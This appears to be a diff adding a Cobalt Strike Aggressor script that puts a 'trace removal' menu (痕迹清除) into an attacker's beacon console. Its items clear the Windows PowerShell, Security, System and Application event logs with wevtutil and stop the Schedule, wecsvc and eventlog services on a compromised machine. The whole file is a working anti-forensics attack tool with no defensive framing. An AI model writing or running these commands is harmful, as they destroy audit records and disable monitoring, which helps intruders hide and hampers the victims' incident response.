@@ -1,0 +1,15 @@
+menu "痕迹清除"{
+	item "清除系统日志" {
+	    blog($1, "-------------------------------------------------------------清除系统日志-------------------------------------------------------------");
+	    bshell($1, "wevtutil cl \"windows powershell\"");
+	    bshell($1, "wevtutil cl \"security\"");
+	    bshell($1, "wevtutil cl \"system\"");
+		bshell($1, "wevtutil cl \"Application\"");
+	}
+	item "禁用事件服务" {
+		blog($1, "-------------------------------------------------------------禁用事件服务-------------------------------------------------------------");
+		bshell($1, "sc stop Schedule");
+		bshell($1, "sc stop wecsvc");
+		bshell($1, "sc stop eventlog");
+	}
+}
